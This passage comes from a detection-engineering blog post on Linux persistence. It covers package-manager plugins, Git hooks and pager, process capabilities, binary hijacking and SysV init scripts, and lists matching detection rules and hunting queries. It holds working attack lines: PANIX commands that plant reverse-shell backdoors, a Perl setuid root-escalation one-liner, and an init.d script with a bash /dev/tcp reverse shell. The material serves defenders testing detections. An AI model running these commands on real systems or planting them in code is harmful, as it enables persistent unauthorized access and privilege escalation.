carefully to not interfere with the YUM update execution flow. Use [this example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2025-L2047) or set it up by running:\n\n```\n\u003e sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --yum\n[+] Yum persistence established\n```\n\nAfter planting the persistence mechanism, a command similar to `sudo yum upgrade` can be run to establish a reverse connection.\n\n![Events generated as a result of package manager (YUM) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image1.png \"Events generated as a result of package manager (YUM) persistence establishment\")\n\nWe see PANIX being executed, `/usr/lib/yumcon`, `/usr/lib/yum-plugins/yumcon.py` and `/etc/yum/pluginconf.d/yumcon.conf` being created. `/usr/lib/yumcon` is executed by `yumcon.py`, which is enabled in `yumcon.conf`. After updating the system, the reverse shell execution chain (`yum` → `sh` → `setsid` → `yumcon` → `python`) is executed. Similar to APT, our YUM coverage is multi-layered, and detects the following events:\n\n| Category | Coverage                                              |\n|----------|-------------------------------------------------------|\n| File     | [Yum Package Manager Plugin File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_yum_package_manager_plugin_file_creation.toml)              |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)           |\n| Process  | [Yum/DNF Plugin Status Discovery](https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml)                       |\n| Network  | [Egress Connection by a YUM Package Manager Descendant](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_yum_package_manager_descendant.toml) |\n\n### T1546.016 - installer packages (DNF)\n\n[DNF](https://man7.org/linux/man-pages/man8/dnf.8.html) (Dandified YUM) is the next-generation package manager used in modern Red Hat-based Linux distributions, including Fedora and CentOS. It replaces YUM while maintaining compatibility with YUM repositories and packages. Similar to YUM, DNF utilizes a [plugin system](https://docs.redhat.com/it/documentation/red_hat_enterprise_linux/9/html/managing_software_with_the_dnf_tool/assembly_configuring-yum_managing-software-with-the-dnf-tool#proc_enabling-and-disabling-yum-plug-ins_assembly_configuring-yum) to extend its functionality, enabling users to integrate custom scripts or programs that execute at key points in the package management lifecycle.\n\nDNF plugins enhance its capabilities by allowing customization and automation beyond standard package management tasks. These plugins are stored in specific directories:\n\n* `/etc/dnf/pluginconf.d/` (for configuration files)\n* `/usr/lib/python3.9/site-packages/dnf-plugins/` (for plugin scripts)\n\nOf course the location for the dnf-plugins are bound to the Python version that is running on your system. Similarly to YUM, to enable a plugin, `plugins=1` must be set in `/etc/dnf/dnf.conf`. An example of a DNF plugin can look like this:\n\n```\nimport dbus\nimport dnf\nfrom dnfpluginscore import _\n\nclass NotifyPackagekit(dnf.Plugin):\n\tname = \"notify-packagekit\"\n\n\tdef __init__(self, base, cli):\n\t\tsuper(NotifyPackagekit, self).__init__(base, cli)\n\t\tself.base = base\n\t\tself.cli = cli\n\tdef transaction(self):\n\t\ttry:\n\t\t\tbus = dbus.SystemBus()\n\t\t\tproxy = bus.get_object('org.freedesktop.PackageKit', '/org/freedesktop/PackageKit')\n\t\t\tiface = dbus.Interface(proxy, dbus_interface='org.freedesktop.PackageKit')\n\t\t\tiface.StateHasChanged('posttrans')\n\t\texcept:\n\t\t\tpass \n```\n\n\nAs for YUM, each plugin must be enabled through a `.conf` configuration file:\n\n```\n[main]                                                                                                                               enabled=1\n```\n\nSimilar to YUM's plugins and APT's configuration files, DNF plugins can be exploited by malicious actors to inject and execute unauthorized code during routine package management tasks. This attack vector extends to automated processes such as system updates, enabling persistent execution on systems with DNF-enabled repositories.\n\n#### Persistence through T1546.016 - installer packages (DNF)\n\nSimilar to APT and YUM, DNF plugins should be crafted carefully to not interfere with the DNF update execution flow. You can use the following [example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2049-L2069) or set it up by running:\n\n```\n\u003e sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2013 --dnf\n\u003e [+] DNF persistence established\n```\n\nRunning a command similar to `sudo dnf update` will trigger the backdoor. Take a look at the events:\n\n![Events generated as a result of package manager (DNF) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image12.png \"Events generated as a result of package manager (DNF) persistence establishment\")\n\nAfter the execution of PANIX, `/usr/lib/python3.9/site-packages/dnfcon`, `/etc/dnf/plugins/dnfcon.conf` and `/usr/lib/python3.9/site-packages/dnf-plugins/dnfcon.py` are created, and the backdoor is established. These locations are dynamic, based on the Python version in use. After triggering it through the `sudo dnf update` command, the `dnf` → `sh` → `setsid` → `dnfcon` → `python` reverse shell chain is initiated. Similar to before, our DNF coverage is multi-layered, and detects the following events:\n\n| Category | Coverage                                              |\n|----------|-------------------------------------------------------|\n| File | [DNF Package Manager Plugin File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_dnf_package_manager_plugin_file_creation.toml)|\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)           |\n| Process  | [Yum/DNF Plugin Status Discovery](https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml)                       |\n| Network  | [Egress Connection by a DNF Package Manager Descendant](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_dnf_package_manager_descendant.toml) |\n\n### Hunting for persistence through T1546.016 - installer packages\n\nHunting for Package Manager persistence can be conducted through ES|QL and OSQuery. Indicators of compromise may include configuration and plugin file creations/modifications and unusual executions of APT/YUM/DNF parents. The [Persistence via Package Manager](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_package_manager.toml) rule contains several ES|QL/OSQuery queries that you can use to detect these abnormalities.\n\n## T1546 - event triggered execution: Git \n\n[Git](https://manpages.debian.org/stretch/git-man/git.1.en.html) is a distributed version control system widely used for managing source code and coordinating collaborative software development. It tracks changes to files and enables efficient team collaboration across different locations. This makes Git a system that is present in a lot of organizations across both workstations and servers. Two functionalities that can be (ab)used for arbitrary code execution are [Git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) and [Git pager](https://www.mslinn.com/git/200-git-pager.html). MITRE has no specific technique attributed to these persistence mechanisms, but they would best fit [T1546](https://attack.mitre.org/techniques/T1546/).\n\n### T1546 - event triggered execution: Git hooks\n\n[Git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are scripts that Git executes before or after specific events such as commits, merges, and pushes. These hooks are stored in the `.git/hooks/` directory within each Git repository. They provide a mechanism for customizing and automating actions during the Git workflow. Common Git hooks include `pre-commit`, `post-commit`, `pre-merge`, and `post-merge`.\n\nAn example of a Git hook would be the file `.git/hooks/pre-commit`, with the following contents:\n\n```\n#!/bin/sh\n# Check if this is the initial commit\nif git rev-parse --verify HEAD \u003e/dev/null 2\u003e\u00261\nthen\n    echo \"pre-commit: About to create a new commit...\"\n    against=HEAD\nelse\n    echo \"pre-commit: About to create the first commit...\"\n    against=4b825dc642cb6eb9a060e54bf8d69288fbee4904\nfi\n```\n\nAs these scripts are executed on specific actions, and the contents of the scripts can be changed in whatever way the user wants, this method can be abused for persistence. Additionally, this method does not require root privileges, making it a convenient persistence technique for instances where root privileges are not yet obtained. These scripts can also be added to Github repositories prior to cloning, turning them into initial access vectors as well. \n\n### T1546 - event triggered execution: git pager\n\nA [pager](https://en.wikipedia.org/wiki/Terminal_pager) is a program used to view content one screen at a time. It allows users to scroll through text files or command output without the text scrolling off the screen. Common pagers include [less](https://www.commandlinux.com/man-page/man1/pager.1.html), [more](https://man7.org/linux/man-pages/man1/more.1.html), and [pg](https://man7.org/linux/man-pages/man1/pg.1.html). A [Git pager](https://www.mslinn.com/git/200-git-pager.html) is a specific use of a pager program to display the output of Git commands. Git allows users to configure a pager to control the display of commands such as `git log`.\n\nGit determines which pager to use through the following order of configuration:\n\n* `/etc/gitconfig` (system-wide)\n* `~/.gitconfig` or `~/.config/git/config` (user-specific)\n* `.git/config` (repository specific)\n\nA typical configuration where a pager is specified might look like this:\n\n```\n[core]\n    pager = less\n```\n\nIn this example, Git is configured to use less as the pager. When a user runs a command like `git log`, Git will pipe the output through less for easier viewing. The flexibility in specifying a pager can be exploited. For example, an attacker can set the pager to a command that executes arbitrary code. This can be done by modifying the `core.pager` configuration to include malicious commands. Let’s take a look at the two techniques discussed in this section. \n\n### Persistence through T1546 - Git\n\nTo test these techniques, the system requires a cloned Git repository. There is no point in setting up a custom repository, as the persistence mechanism depends on user actions, making a hidden and unused Git repository an illogical construct. You could initialize your own hidden repository and chain it together with a `cron`/`systemd`/`udev` persistence mechanism to initialize the repository on set intervals, but that is out of scope for now.\n\nTo test the Git Hook technique, ensure a Git repository is available on the system, and run:\n\n```\n\u003e ./panix.sh --git --default --ip 192.168.1.1 --port 2014 --hook\n```\n\n`\u003e [+] Created malicious pre-commit hook in /home/ruben/panix`\n\nThe program loops through the entire filesystem (as far as this is possible, based on permissions), finds all of the repositories, and backdoors them. To trigger the backdoor, run `git add -A` and `git commit -m \"backdoored!\"`. This will generate the following events:\n\n![Events generated as a result of the Git Hook persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image3.png \"Events generated as a result of the Git Hook persistence establishment\")\n\nIn this figure we see PANIX looking for Git repositories, adding a `pre-commit` hook and granting it execution permissions, successfully planting the backdoor. Next, the backdoor is initiated through the `git commit`, and the `git` → `pre-commit` → `nohup` → `setsid` → `bash` reverse shell connection is initiated.\n\nTo test the Git pager technique, ensure a Git repository is available on the system and run: \n\n```\n\u003e ./panix.sh --git --default --ip 192.168.1.1 --port 2015 --pager\n\u003e [+] Updated existing Git config with malicious pager in /home/ruben/panix\n\u003e [+] Updated existing global Git config with malicious pager \n```\n\nTo trigger the payload, move into the backdoored repository and run a command such as `git log`. This will trigger the following events:\n\n![Events generated as a result of the Git Pager persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image15.png \"Events generated as a result of the Git Pager persistence establishment\")\n\nPANIX executes and starts searching for Git repositories. Once found, the configuration files are updated or created, and the backdoor is planted. Invoking the Git Pager (`less`) executes the backdoor, setting up the `git` → `sh` → `nohup` → `setsid` → `bash` reverse connection chain. \n\nWe have several layers of detection, covering the Git Hook/Pager persistence techniques.\n\n| Category | Coverage                                            |\n|----------|-----------------------------------------------------|\n| File     | [Git Hook Created or Modified](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_file_creation.toml)                        |\n| Process  | [Git Hook Child Process](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_process_execution.toml)                              |\n|          | [Git Hook Command Execution](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_execution.toml)                          |\n|          | [Linux Restricted Shell Breakout via Linux Binary(s)](https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_evasion_linux_binary.toml) |\n| Network  | [Git Hook Egress Network Connection](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_netcon.toml)                  |\n\n### Hunting for persistence through T1546 - Git\n\nHunting for Git Hook/Pager persistence can be conducted through ES|QL and OSQuery. Potential indicators include file creations in the `.git/hook/` directories, Git Hook executions, and the modification/creation of Git configuration files. The [Git Hook/Pager Persistence](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_git_hook_pager.toml) hunting rule has several ES|QL and OSQuery queries that will aid in detecting this technique.\n\n## T1548 - abuse elevation control mechanism: process capabilities\n\n[Process capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) are a fine-grained access control mechanism that allows the division of the root user's privileges into distinct units. These capabilities can be independently enabled or disabled for processes, and are used to enhance security by limiting the privileges of processes. Instead of granting a process full root privileges, only the necessary capabilities are assigned, reducing the risk of exploitation. This approach follows the principle of least privilege.\n\nTo better understand them, some use cases for process capabilities are e.g. assigning `CAP_NET_BIND_SERVICE` to a web server that needs to bind to port 80, assigning `CAP_NET_RAW` to tools that need access to network interfaces or assigning `CAP_DAC_OVERRIDE` to backup software requiring access to all files. By leveraging these capabilities, processes are capable of performing tasks that are usually only possible with root access.\n\nWhile process capabilities were developed to enhance security, once root privileges are acquired, attackers can abuse them to maintain persistence on a compromised system. By setting specific capabilities on binaries or scripts, attackers can ensure their malicious processes can operate with elevated privileges and allow for an easy way back to root access in case of losing it. Additionally, misconfigurations may allow attackers to escalate privileges. \n\nSome process capabilities can be (ab)used to establish persistence, escalate privileges, access sensitive data, or conduct other tasks. Process capabilities that can do this include, but are not limited to:\n\n* `CAP_SYS_MODULE` (allows loading/unloading of kernel modules)\n* `CAP_SYS_PTRACE` (enables tracing and manipulation of other processes)\n* `CAP_DAC_OVERRIDE` (bypasses read/write/execute checks)\n* `CAP_DAC_READ_SEARCH` (grants read access to any file on the system)\n* `CAP_SETUID`/`CAP_SETGID` (manipulate UID/GID)\n* `CAP_SYS_ADMIN` (to be honest, this just means root access)\n\nA simple way of establishing persistence is to grant the process `CAP_SETUID` or `CAP_SETGID` capabilities (this is similar to setting the `SUID`/`SGID` bit to a process, which we discussed in [the previous persistence blog](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)). But all of the ones above can be used, be a bit creative here! MITRE does not have a technique dedicated to process capabilities. Similar to Setuid/Setgid, this technique can be leveraged for both privilege escalation and persistence. The most logical technique to add this mechanism to (based on the existing structure of the MITRE ATT\u0026CK framework) would be [T1548](https://attack.mitre.org/techniques/T1548/). \n\n### Persistence through T1548 - process capabilities\n\nLet’s leverage PANIX to set up a process with `CAP_SETUID` process capabilities by running:\n\n```\n\u003e sudo ./panix.sh --cap --default\n[+] Capability setuid granted to /usr/bin/perl\n[-] ruby, is not present on the system.\n[-] php is not present on the system.\n[-] python is not present on the system.\n[-] python3, is not present on the system.\n[-] node is not present on the system. \n```\n\nPANIX will by-default check for a list of processes that are easily exploitable after granting `CAP_SETUID` capabilities. You can use `--custom` and specify `--capability` and `--binary` to test some of your own. \n\nIf your system has `Perl`, you can take a look at [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) to find how to escalate privileges with this capability set. \n\n```\n/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n# whoami\nroot\n```\n\nLooking at the logs in Discover, we can see the following happening:\n\n![Events generated as a result of the Linux capability persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image13.png \"Events generated as a result of the Linux capability persistence establishment\")\n\nWe can see PANIX being executed with `uid=0` (root), which grants `cap_setuid+ep` (effective and permitted) to `/usr/bin/perl`. Effective indicates that the capability is currently active for the process, while permitted indicates that the capability is allowed to be used by the process. Note that all events with `uid=0` have all effective/permitted capabilities set. After granting this capability and dropping down to user permissions, `perl` is executed and manipulates its own process UID to obtain root access. Feel free to try out different binaries/permissions.\n\nAs we have quite an extensive list of rules related to process capabilities (for discovery, persistence and privilege escalation activity), we will not list all of them here. Instead, you can take a look at [this blog post](https://www.elastic.co/security-labs/unlocking-power-safely-privilege-escalation-via-linux-process-capabilities), digging deeper into this topic.\n\n### Hunting for persistence through T1548 - process capabilities\n\nHunting for process capability persistence can be done through ES|QL. We can either do a general hunt and find non uid 0 binaries with capabilities set, or hunt for specific potentially dangerous capabilities. To do so, we created the [Process Capability Hunting](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_process_capabilities.toml) rule.\n\n## T1554 - compromise host software binary: hijacking system binaries\n\nAfter gaining access to a system and, if necessary, escalating privileges to root access, system binary hijacking/wrapping is another option to establish persistence. This method relies on the trust and frequent execution of system binaries by a user. \n\nSystem binaries, located in directories like `/bin`, `/sbin`, `/usr/bin`, and `/usr/sbin` are commonly used by users/administrators to perform basic tasks. Attackers can hijack these system binaries by replacing or backdooring them with malicious counterparts. System binaries that are used often such as `cat`, `ls`, `cp`, `mv`, `less` or `sudo` are perfect candidates, as this mechanism relies on the user executing the binary. \n\nThere are multiple ways to establish persistence through this method. The attacker may manipulate the system’s `$PATH` environment variable to prioritize a malicious binary over the regular system binary. Another method would be to replace the real system binary, executing arbitrary malicious code on launch, after which the regular command is executed.\n\nAttackers can be creative in leveraging this technique, as any code can be executed. For example, the system-wide `sudo`/`su` binaries can be backdoored to capture a password every time a user attempts to run a command with `sudo`. Another method can be to establish a reverse connection every time a binary is executed or a backdoor binary is called on each binary execution. As long as the attacker hides well and no errors are presented to the user, this technique is difficult to detect. MITRE does not have a direct reference to this technique, but it probably fits [T1554](https://attack.mitre.org/techniques/T1554/) best.\n\nLet’s take a look at what hijacking system binaries might look like. \n\n### Persistence through T1554 - hijacking system binaries\n\nThe implementation of system binary hijacking in PANIX leverages the wrapping of a system binary to establish a reverse connection to a specified IP. You can reference this [example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2391-L2401) or set it up by executing:\n\n```\n\u003e sudo ./panix.sh --system-binary --default --ip 192.168.1.1 --port 2016\n\u003e [+] cat backdoored successfully.\n\u003e [+] ls backdoored successfully.\n```\n\nNow, execute `ls` or `cat` to establish persistence. Let’s analyze the logs. \n\n![Events generated as a result of the Linux system binary hijacking persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image11.png \"Events generated as a result of the Linux system binary hijacking persistence establishment\")\n\nIn the figure above we see PANIX executing, moving `/usr/bin/ls` to `/usr/bin/ls.original`. It then backdoors `/usr/bin/ls` to execute arbitrary code, after which it calls `/usr/bin/ls.original` in order to trick the user. Afterwards, we see `bash` setting up the reverse connection. The copying/renaming of system binaries and the hijacking of the `sudo` binary are captured in the following detection rules.\n\n| Category | Coverage                      |\n|----------|-------------------------------|\n| File     | [System Binary Moved or Copied](https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_binary_copied_to_suspicious_directory.toml) |\n|          | [Potential Sudo Hijacking](https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_sudo_hijacking.toml)      |\n\n### Hunting for persistence through T1554 - hijacking system binaries\n\nThis activity should be very uncommon, and therefore the detection rules above can be leveraged for hunting. Another way of hunting for this activity could be assembling a list of uncommon binaries to spawn child processes. To aid in this process we created the [Unusual System Binary Parent (Potential System Binary Hijacking Attempt)](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_unusual_system_binary_parent.toml) hunting rule.\n\n## Conclusion\n\nIn this part of our “Linux Detection Engineering” series, we explored more advanced Linux persistence techniques and detection strategies, including init systems, run control scripts, message of the day, udev (rules), package managers, Git, process capabilities, and system binary hijacking. If you missed the previous part on persistence, catch up [here](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms).\n\nWe did not only explain each technique but also demonstrated how to implement them using [PANIX](https://github.com/Aegrah/PANIX). This hands-on approach allowed you to assess detection capabilities in your own security setup. Our discussion included detection and endpoint rule coverage and referenced effective hunting strategies, from ES|QL aggregation queries to live OSQuery hunts.\n\nWe hope you've found this format informative. Stay tuned for more insights into Linux detection engineering. Happy hunting!\n","code":"var Component=(()=\u003e{var h=Object.create;var r=Object.defineProperty;var u=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var f=(i,e)=\u003e()=\u003e(e||i((e={exports:{}}).exports,e),e.exports),b=(i,e)=\u003e{for(var n in e)r(i,n,{get:e[n],enumerable:!0})},a=(i,e,n,o)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let s of p(e))!g.call(i,s)\u0026\u0026s!==n\u0026\u0026r(i,s,{get:()=\u003ee[s],enumerable:!(o=u(e,s))||o.enumerable});return i};var y=(i,e,n)=\u003e(n=i!=null?h(m(i)):{},a(e||!i||!i.__esModule?r(n,\"default\",{value:i,enumerable:!0}):n,i)),w=i=\u003ea(r({},\"__esModule\",{value:!0}),i);var l=f((P,c)=\u003e{c.exports=_jsx_runtime});var _={};b(_,{default:()=\u003ex,frontmatter:()=\u003ev});var t=y(l()),v={title:\"Linux Detection Engineering - A Sequel on Persistence Mechanisms\",slug:\"sequel-on-persistence-mechanisms\",date:\"2024-08-30\",subtitle:\"A walkthrough on how threat actors establish persistence on Linux systems and how to hunt for these techniques.\",description:\"In this final part of this Linux persistence series, we'll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them.\",author:[{slug:\"ruben-groenewoud\"}],image:\"sequel-on-persistence-mechanisms.jpg\",category:[{slug:\"detection-science\"}],tags:[\"linux\",\"persistence\"]};function d(i){let e=Object.assign({h2:\"h2\",p:\"p\",a:\"a\",ul:\"ul\",li:\"li\",h3:\"h3\",code:\"code\",pre:\"pre\",h4:\"h4\",img:\"img\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\"},i.components);return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:\"introduction\",children:\"Introduction\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"In this third part of the \",(0,t.jsx)(e.a,{href:\"https://search.elastic.co/?q=Linux%20Detection%20Engineering\u0026location%5B0%5D=Security%20Labs\u0026author%5B0%5D=Ruben%20Groenewoud\",rel:\"nofollow\",children:\"Linux Detection Engineering series\"}),\", we\\u2019ll dive deeper into the world of Linux persistence. We start with common or straightforward methods and move towards more complex or obscure techniques. The goal remains the same: to educate defenders and security researchers on the foundational aspects of Linux persistence by examining both trivial and more complicated methods, understanding how these methods work, how to hunt for them, and how to develop effective detection strategies.\"]}),`\n`,(0,t.jsxs)(e.p,{children:['In the previous article - \"Linux Detection Engineering - a primer on persistence mechanisms\" - we explored the foundational aspects of Linux persistence techniques. If you missed it, you can find it ',(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"We'll set up the persistence mechanisms, analyze the logs, and observe the potential detection opportunities. To aid in this process, we\\u2019re sharing \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\", a Linux persistence tool that Ruben Groenewoud of Elastic Security developed. PANIX simplifies and customizes persistence setup to test potential detection opportunities.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"By the end of this series, you'll have gained a comprehensive understanding of each of the persistence mechanisms that we covered, including:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"How it works (theory)\"}),`\n`,(0,t.jsx)(e.li,{children:\"How to set it up (practice)\"}),`\n`,(0,t.jsx)(e.li,{children:\"How to detect it (SIEM and Endpoint rules)\"}),`\n`,(0,t.jsx)(e.li,{children:\"How to hunt for it (ES|QL and OSQuery reference hunts)\"}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:\"Let\\u2019s go beyond the basics and dig a little bit deeper into the world of Linux persistence, it\\u2019s fun!\"}),`\n`,(0,t.jsx)(e.h2,{id:\"setup-note\",children:\"Setup note\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules\",rel:\"nofollow\",children:\"enable and update our pre-built detection rules\"}),\". If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill in any gaps. Now, we are ready to get started.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1037---boot-or-logon-initialization-scripts-init\",children:\"T1037 - boot or logon initialization scripts: Init\"}),`\n`,(0,t.jsx)(e.p,{children:'Init, short for \"initialization,\" is the first process started by the kernel during the boot process on Unix-like operating systems. It continues running until the system is shut down. The primary role of an init system is to start, stop, and manage system processes and services.'}),`\n`,(0,t.jsxs)(e.p,{children:[\"There are three major init implementations - \",(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man1/systemd.1.html\",rel:\"nofollow\",children:\"Systemd\"}),\", \",(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/8/service\",rel:\"nofollow\",children:\"System V\"}),\", and \",(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/7/upstart\",rel:\"nofollow\",children:\"Upstart\"}),\". In \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"part 1\"}),\" of this series, we focused on Systemd. In this part, we will explore System V and Upstart. MITRE does not have specific categories for System V or Upstart. These are generally part of \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1037/\",rel:\"nofollow\",children:\"T1037\"}),\".\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"t1037---boot-or-logon-initialization-scripts-system-v-init\",children:\"T1037 - boot or logon initialization scripts: System V init\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/8/service\",rel:\"nofollow\",children:\"System V (SysV) init\"}),\" is one of the oldest and most traditional init systems. SysV init scripts are gradually being replaced by modern init systems like Systemd. However, \",(0,t.jsx)(e.code,{children:\"systemd-sysv-generator\"}),\" allows Systemd to handle traditional SysV init scripts, ensuring older services and applications can still be managed within the newer framework.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The \",(0,t.jsx)(e.code,{children:\"/etc/init.d/\"}),\" directory is a key component of the SysV init system. It is responsible for controlling the startup, running, and shutdown of services on a system. Scripts in this directory are executed at different run levels to manage various system services. Despite the rise of Systemd as the default init system in many modern Linux distributions, \",(0,t.jsx)(e.code,{children:\"init.d\"}),\" scripts are still widely used and supported, making them a viable option for persistence.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The scripts in \",(0,t.jsx)(e.code,{children:\"init.d\"}),\" are used to start, stop, and manage services. These scripts are executed with root privileges, providing a powerful means for both administrators and attackers to ensure certain commands or services run on boot. These scripts are often linked to \",(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/7/runlevel\",rel:\"nofollow\",children:\"runlevel\"}),\" directories like \",(0,t.jsx)(e.code,{children:\"/etc/rc0.d/\"}),\", \",(0,t.jsx)(e.code,{children:\"/etc/rc1.d/\"}),\", etc., which determine when the scripts are run. Runlevels, ranging from 0 to 6, define specific operational states, each configuring different services and processes to manage system behavior and user interactions. Runlevels vary depending on the distribution, but generally look like the following:\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"0: Shutdown\"}),`\n`,(0,t.jsx)(e.li,{children:\"1: Single User Mode\"}),`\n`,(0,t.jsx)(e.li,{children:\"2: Multiuser mode without networking\"}),`\n`,(0,t.jsx)(e.li,{children:\"3: Multiuser mode with networking\"}),`\n`,(0,t.jsx)(e.li,{children:\"4: Unused\"}),`\n`,(0,t.jsx)(e.li,{children:\"5: Multiuser mode with networking and GUI\"}),`\n`,(0,t.jsx)(e.li,{children:\"6: Reboot\"}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"During system startup, scripts are executed based on the current runlevel configuration. Each script must follow a specific structure, including \",(0,t.jsx)(e.code,{children:\"start\"}),\", \",(0,t.jsx)(e.code,{children:\"stop\"}),\", \",(0,t.jsx)(e.code,{children:\"restart\"}),\", and \",(0,t.jsx)(e.code,{children:\"status\"}),\" commands to manage the associated service. Scripts prefixed with \",(0,t.jsx)(e.code,{children:\"S\"}),\" (start) or \",(0,t.jsx)(e.code,{children:\"K\"}),\" (kill) dictate actions during startup or shutdown, respectively, ordered by their numerical sequence.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"An \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1864-L1881\",rel:\"nofollow\",children:\"example\"}),\" of a malicious \",(0,t.jsx)(e.code,{children:\"init.d\"}),\" script might look similar to the following:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`#! /bin/sh\n### BEGIN INIT INFO\n# Provides:             malicious-sysv-script\n# Required-Start:       $remote_fs $syslog\n# Required-Stop:        $remote_fs $syslog\n# Default-Start:        2 3 4 5\n# Default-Stop:         0 1 6\n### END INIT INFO\n\ncase \"$1\" in\n  start)\n    echo \"Starting malicious-sysv-script\"\n    nohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\n    ;;\nesac\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The script must be placed in the \",(0,t.jsx)(e.code,{children:\"/etc/init.d/\"}),\" directory and be granted execution permissions. Similarly to Systemd services, SysV scripts must also be enabled. A common utility to manage SysV configurations is \",(0,t.jsx)(e.code,{children:\"update-rc.d\"}),\". It allows administrators to enable or disable services and manage the symbolic links (start and kill scripts) in the \",(0,t.jsx)(e.code,{children:\"/etc/rc*.d/\"}),\" directories, automatically setting the correct runlevels based on the configuration of the script.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sudo update-rc.d malicious-sysv-script defaults\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The \",(0,t.jsx)(e.code,{children:\"malicious-sysv-script\"}),\" is now enabled and ready to run on boot. MITRE specifies more information and real-world examples related to this technique in \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1037/\",rel:\"nofollow\",children:\"T1037\"}),\".\"]}),`\n`,(0,t.jsx)(e.h4,{id:\"persistence-through-t1037---system-v-init\",children:\"Persistence through T1037 - System V init\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"You can manually set up a test script within the \",(0,t.jsx)(e.code,{children:\"/etc/init.d/\"}),\" directory, grant it execution permissions, enable it, and reboot it, or simply use \",(0,t.jsx)(e.a,{href:\"https://github.com/aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\". PANIX is a Linux persistence tool that simplifies and customizes persistence setup for testing your detections. We can use it to establish persistence simply by 